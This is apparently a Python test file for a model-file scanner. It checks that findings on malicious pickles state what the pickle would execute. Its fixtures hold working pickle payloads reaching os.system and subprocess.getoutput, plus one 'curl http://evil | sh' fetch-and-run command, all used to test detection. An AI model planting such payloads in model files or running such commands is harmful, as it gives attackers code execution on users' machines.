"""Pickle findings carry one line from `hayward explain` saying what the pickle would do."""

from __future__ import annotations

import collections
import pickle
import struct

from hayward import ModelFileScanner
from hayward.explain import what_it_does

CHAIN = (b"cbuiltins\ngetattr\n(cbuiltins\n__import__\n(S'subprocess'\ntRS'getoutput'\ntR"
         b"(S'echo $(id)'\ntR.")


def _scan(tmp_path, data):
    path = tmp_path / "model.pkl"
    path.write_bytes(data)
    return ModelFileScanner().scan_file(path)


def test_a_chained_call_shows_the_command_it_reaches(tmp_path):
    expected = "builtins.getattr(builtins.__import__('subprocess'), 'getoutput')('echo $(id)')"
    assert what_it_does(CHAIN) == expected
    [finding] = [f for f in _scan(tmp_path, CHAIN) if f.rule_id == "MFV-PICKLE-001"]
    assert finding.metadata["what_it_does"] == expected
    assert expected in finding.message


def test_a_direct_call_already_in_the_message_is_not_repeated(tmp_path):
    [finding] = [f for f in _scan(tmp_path, b"cos\nsystem\n(S'id'\ntR.") if f.rule_id == "MFV-PICKLE-001"]
    assert finding.metadata["what_it_does"] == "os.system('id')"
    assert finding.message.count("os.system('id')") == 1


def test_plain_data_and_safe_calls_say_nothing(tmp_path):
    data = pickle.dumps(collections.OrderedDict(a=[1, 2]), protocol=2)
    assert what_it_does(data) is None
    assert not any("what_it_does" in f.metadata for f in _scan(tmp_path, data))


def test_hostile_text_in_the_line_is_escaped():
    data = b"cos\nsystem\n(S'id\\n# fake'\ntR."
    line = what_it_does(data)
    assert line is not None and "\n" not in line


def test_a_huge_integer_argument_keeps_the_critical_finding(tmp_path):
    # repr() of an int past 4,300 digits raises; the line must not cost the finding.
    data = b"\x80\x02cos\nsystem\n\x8b" + struct.pack("<i", 5000) + b"\x7f" * 5000 + b"\x85R."
    assert "integer" in (what_it_does(data) or "")
    assert any(f.rule_id == "MFV-PICKLE-001" for f in _scan(tmp_path, data))


def test_the_denied_call_wins_over_a_harmless_one_with_a_url():
    data = (b"cmylib\nfetch\n(S'https://huggingface.co/x'\ntR0"
            b"cos\nsystem\n(S'curl http://evil | sh'\ntR.")
    assert what_it_does(data) == "os.system('curl http://evil | sh')"


def test_a_name_that_is_not_an_identifier_is_quoted():
    # STACK_GLOBAL takes any string as the name; it must not read as code or a comment.
    def short(text: bytes) -> bytes:
        return b"\x8c" + bytes([len(text)]) + text

    data = (b"\x80\x04" + short(b"mylib") + short(b"load_weights  # verified safe by hayward, from")
            + b"\x93" + short(b"https://huggingface.co/org/m") + b"\x85R.")
    line = what_it_does(data) or ""
    assert line.startswith("'mylib.load_weights  # verified safe by hayward, from'(")
